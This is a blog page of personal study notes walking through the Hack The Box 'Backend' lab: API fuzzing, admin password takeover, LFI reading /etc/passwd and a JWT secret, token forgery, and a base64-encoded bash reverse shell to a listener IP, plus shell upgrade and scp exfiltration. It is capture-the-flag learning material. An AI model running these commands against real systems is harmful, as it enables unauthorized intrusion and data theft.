@@ -1,0 +1,379 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>[HTB]Backend - API | 持剑</title>
+<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://1dayluo.github.io">
+        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://1dayluo.github.io">
+        <h1 class="site-title">持剑</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">[HTB]Backend - API</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-04-17</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://1dayluo.github.io/tag/ZYt2rq1nxl/">
+                    笔记
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
+                    HTB
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/94ILJZFTzZQ/">
+                    API
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h1 id="backend-api">Backend - API</h1>
+<p>突然想做这个box的起因是看到一条tweet，qwq 原来做box这么有用的嘛</p>
+<figure data-type="image" tabindex="1"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled.png20220417a.png" alt="Untitled" loading="lazy"></figure>
+<p>learn from IppSec Video：</p>
+<p><a href="https://www.youtube.com/watch?v=x6Kpkl0C2xg">HackTheBox - Backend</a></p>
+<p>/b</p>
+<p>the article：</p>
+<p><a href="https://0xdf.gitlab.io/2022/04/12/htb-backend.html">HTB: Backend</a></p>
+<p>笔记基本上是看着IpSec的视频做的，给以后温习用。尝试用英文做笔记，增加自己英文写作能力。</p>
+<h2 id="nmap">nmap</h2>
+<p>Start of nmap</p>
+<p>command：</p>
+<pre><code class="language-bash">sudo nmap -sC -sV -oA nmap/backend 10.10.11.161
+</code></pre>
+<ul>
+<li>-sC: default script</li>
+<li>-sV: enumerate versions</li>
+<li>-oA: export the scan results in all the available formats at once\</li>
+</ul>
+<p><strong>result:</strong></p>
+<ul>
+<li>22/tcp:
+<ul>
+<li>ssh</li>
+</ul>
+</li>
+<li>80/tcp
+<ul>
+<li>uvicor</li>
+<li>response to us with json</li>
+</ul>
+</li>
+</ul>
+<h2 id="gobuster">gobuster</h2>
+<p>Examining the webpage, just finding json. Running gobuster to discover /docs and /api</p>
+<p>command</p>
+<pre><code class="language-bash">gobuster dir -u http://10.10.11.161 
+</code></pre>
+<p><strong>result:</strong></p>
+<ul>
+<li>find /api endpoint
+<ul>
+<li>endpoint: /api/v1/user
+<ul>
+<li>response status:404</li>
+</ul>
+</li>
+<li>endpoint: /api/v1/admin
+<ul>
+<li>response status:307</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="examing-the-endpoint">Examing the endpoint</h2>
+<aside>
+💡 when endpoint with user,you can try id number
+</aside>
+<p>try:</p>
+<ul>
+<li>/api/v1/user/1</li>
+<li>/api/v1/user/login
+<ul>
+<li>try change request methods</li>
+</ul>
+</li>
+</ul>
+<h2 id="api-discovery">API Discovery</h2>
+<aside>
+💡 This section IppSec talking about why API Discovery differs from normal web, instead of extensions we fuzz methods
+</aside>
+<h3 id="gobuster-2">gobuster</h3>
+<p>command</p>
+<pre><code class="language-bash">gobuster dir -u http://10.10.11.161/api/v1/user -w /opt/SecList/Discovery/Web-Content/raft-small-words.txt
+</code></pre>
+<h3 id="feroxbuster">feroxbuster</h3>
+<p>command</p>
+<pre><code class="language-bash">feroxbuster dir -u http://10.10.11.161/api/v1/user -w /opt/SecList/Discovery/Web-Content/raft-small-words.txt
+</code></pre>
+<h3 id="wfuzz">wfuzz</h3>
+<p>command</p>
+<pre><code class="language-bash">wfuzz -X POST -w /opt/SecList/Discovery/Web-Content/common.txt  http://10.10.11.161/api/v1/user/FUZZ
+</code></pre>
+<p>hide 404 and 405 status code</p>
+<pre><code class="language-bash">wfuzz -X POST -w /opt/SecList/Discovery/Web-Content/common.txt  http://10.10.11.161/api/v1/user/FUZZ --hc 404,405
+</code></pre>
+<h2 id="fuzzing-signup">Fuzzing signup</h2>
+<p>使用 <code>wfuzz</code> 检测出api存在signup结点</p>
+<p>这里使用burpsuite做测试</p>
+<h2 id="curl-behavestroubleshoot">Curl behaves&amp;<strong><strong>troubleshoot</strong></strong></h2>
+<aside>
+💡 Showing that curl behaves differently. Lets troubleshoot this by sending our curl and burpsuite to wireshark and seeing why its behaving differently
+</aside>
+<p>Using below command,and you find response is different from burpsuite</p>
+<pre><code class="language-bash">curl -X POST  http://10.10.11.161/api/v1/signup -d 'user=ipp' | jq .
+</code></pre>
+<p>even you add <code>Content-Type</code> header,the response is stiil different from burpsuite</p>
+<pre><code class="language-bash">curl -X POST  http://10.10.11.161/api/v1/signup -H 'Content-Type: application/json' -d 'user=ipp' | jq .
+</code></pre>
+<p>so，the next we use wireshark to capture the package，and find the reason</p>
+<figure data-type="image" tabindex="2"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%201.png20220417a.png" alt="Untitled" loading="lazy"></figure>
+<p>find curl could magic add something</p>
+<h2 id="attemping-to-login-with-our-credential">Attemping to login with our credential</h2>
+<p>需要修改一下header(非json格式）</p>
+<pre><code class="language-bash">Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>返回了token</p>
+<figure data-type="image" tabindex="3"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%202.png20220417a.png" alt="Untitled" loading="lazy"></figure>
+<p><code>access_token</code> 的值为jwt token</p>
+<h2 id="accessing-docs-endpoint">Accessing /docs endpoint</h2>
+<p>In above section,we get jwt token and next we use it to /docs endpoint</p>
+<p>add header: <code>Authorization:bearer</code></p>
+<figure data-type="image" tabindex="4"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%203.png20220417a.png" alt="Untitled" loading="lazy"></figure>
+<p>and send this request,we find application make a new request to /openapi endpoint.and now <strong>we have the documentation of the api</strong></p>
+<figure data-type="image" tabindex="5"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%204.png20220417a.png" alt="Untitled" loading="lazy"></figure>
+<p>You can find there’s nothing just defined for just /user( /api/v1/user endpoint),but admin is different,there’s /api/v1/admin endpoint</p>
+<figure data-type="image" tabindex="6"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%205.png20220417a.png" alt="Untitled" loading="lazy"></figure>
+<h2 id="authenticating-in-the-swagger">Authenticating in the swagger</h2>
+<p>虽然admin没有权限，但是你可以点这个 🔒 的图标去登陆备</p>
+<figure data-type="image" tabindex="7"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%206.png20220417a.png" alt="Untitled" loading="lazy"></figure>
+<p>然后，但是这样创建的用户也不是管理员</p>
+<p>but after login the user what we created, we don’t have the authentical to /admin</p>
+<figure data-type="image" tabindex="8"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%207.png20220417a.png" alt="Untitled" loading="lazy"></figure>
+<p>you can use <code>/user/{user-id}</code> to get the id of ‘1’,and copy his guid</p>
+<p>the go <code>/api/v1/user/updatepass</code> to update password of user 1</p>
+<h2 id="login-in-with-admin-and-do-something">Login in with admin and do something</h2>
+<h3 id="apiv1adminfile">/api/v1/admin/file</h3>
+<p>now we can login in with admin,and then we go pass <code>/api/v1/admin/file</code>  to get <code>/etc/passwd</code></p>
+<h3 id="apiv1adminexeccommand">/api/v1/admin/exec/{command}</h3>
+<aside>
+💡 You can use [jwt.io](http://jwt.io) to parse your jwt token
+</aside>
+<p>we put our jwt token to <a href="http://jwt.io">jwt.io</a> to parse it，and as result there’s not much information here</p>
+<h2 id="exploring-the-procself-directory-with-the-lfi">Exploring the /proc/self directory with the LFI</h2>
+<h3 id="apiv1adminfile-2"><strong><code>/api/v1/admin/file</code></strong></h3>
+<p>use burpsuite to capture <code>/api/v1/admin/file</code>  ，construct the request body as this</p>
+<pre><code class="language-bash">{
+	&quot;file&quot;:&quot;/proc/self/cmdline&quot;
+}
+</code></pre>
+<ul>
+<li><code>/proc/self/cmdline</code> 代表当前程序命令行参数（<a href="https://blog.csdn.net/whatday/article/details/108897457">https://blog.csdn.net/whatday/article/details/108897457</a>）</li>
+</ul>
+<h3 id="procselfenviron"><code>**/proc/self/environ</code>**</h3>
+<pre><code class="language-bash">{
+	&quot;file&quot;:&quot;/proc/self/environ&quot;
+}
+</code></pre>
+<ul>
+<li><code>/proc/self/environ</code>  find the program’s envrionment</li>
+</ul>
+<pre><code class="language-bash">APP_MODULE=app.main:app...etc
+PWD=/home/htb/uhc
+</code></pre>
+<h3 id="get-the-py-source-code"><strong>get the .py source code</strong></h3>
+<pre><code class="language-bash">{
+	&quot;file&quot;:&quot;/home/htb/uhc/app/main.py&quot;
+}
+</code></pre>
+<h3 id="copy-souce-code-to-vim">Copy souce code to vim</h3>
+<h3 id="read-mainpy">read main.py</h3>
+<p>open vim</p>
+<ul>
+<li><code>:set paste</code></li>
+<li><code>%s/\\n/\r/g</code></li>
+</ul>
+<p>When you formatting your python source code,you will find  uder the  <code>[main.py](http://main.py)</code> has the line 20 ：<code>app.core.config import settings</code></p>
+<h3 id="read-appcoreconfig">read app.core.config</h3>
+<p>using endpoint <code>/api/v1/admin/file</code>  to read configuration file : <code>[config.py](http://config.py)</code></p>
+<p>you will find <code>JWT_SECRET</code></p>
+<h3 id="using-jwt_secret-to-generate-jwt">using <code>JWT_SECRET</code> to generate jwt</h3>
+<p>then go jwt.io, change the history jwt parsing result.</p>
+<p>( <code>”debug”: true</code> 是新增的一行， <code>HMACSHA256</code> 下将 <code>your-256-bit-secret</code> 改为 <code>JWT_SECRET</code> )</p>
+<figure data-type="image" tabindex="9"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%208.png20220417a.png" alt="Untitled" loading="lazy"></figure>
+<h3 id="set-new-jwt-to-apiv1adminexecwhoami">set new jwt  to <code>/api/v1/admin/exec/whoami</code></h3>
+<p>before you set your new jwt</p>
+<figure data-type="image" tabindex="10"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%209.png20220417a.png" alt="Untitled" loading="lazy"></figure>
+<p>after you set your new jwt</p>
+<figure data-type="image" tabindex="11"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%2010.png20220417a.png" alt="Untitled" loading="lazy"></figure>
+<h2 id="bypass-slash-restrict-in-url">bypass slash restrict in url</h2>
+<aside>
+💡 Notice: you should enter more space to prevent `+` in your base64 encode string(it will influence the header’s url constructing)
+but if you will urlencode all your string,it doesn’t matter
+</aside>
+<p>when you try <code>/api/v1/admin/exec/echo%20&quot;AB\/C&quot;</code> or <code>/api/v1/admin/exec/echo%20&quot;AB%2FC&quot;</code> the slash will be seen as the part of url</p>
+<p>so,you should use base64 to encode the slash</p>
+<pre><code class="language-bash">echo 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/9001  0&gt;&amp;1' | base 64 -w 0
+</code></pre>
+<p>your local bash should use nc to listen the port</p>
+<pre><code class="language-bash">nc -lvnp 9001
+</code></pre>
+<p>then put the base64 encode into url and add <code>| base64 -d | bash</code>  to decode base64 and exec as bash command</p>
+<figure data-type="image" tabindex="12"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%2011.png20220417a.png" alt="Untitled" loading="lazy"></figure>
+<p>then urlencode all your payload and send it !</p>
+<p>you local nc  will get shell</p>
+<h2 id="getting-a-reverse-shell">getting a reverse shell</h2>
+<p>这块感觉要多学学</p>
+<p>after nc get shell, input</p>
+<pre><code class="language-bash">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<pre><code class="language-bash">stty raw -echo; fg
+</code></pre>
+<p>learn about more <code>stty</code> ： <a href="https://man7.org/linux/man-pages/man1/stty.1.html">https://man7.org/linux/man-pages/man1/stty.1.html</a></p>
+<p>cn manual：<a href="https://man.archlinux.org/man/stty.1.zh_TW">https://man.archlinux.org/man/stty.1.zh_TW</a></p>
+<h2 id="authlog-scp">auth.log&amp; scp</h2>
+<p>find the password。。。</p>
+<p>and you also can paste your public key to authroized_keys file,scp the file</p>
+<pre><code class="language-bash">scp -r -i backend root@10.10.11.161:/home/htb/uhc .
+</code></pre>
+<p>: -r : recursive (because it is a folder)</p>
+<p>you can also tar all the file to <code>bz2</code></p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://1dayluo.github.io/post/wo-de-xue-xi-bi-ji-he-yi-xie-xiang-mu/">
+              <h3 class="post-title">
+                下一篇：我的学习笔记和一些项目&amp;吐槽
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
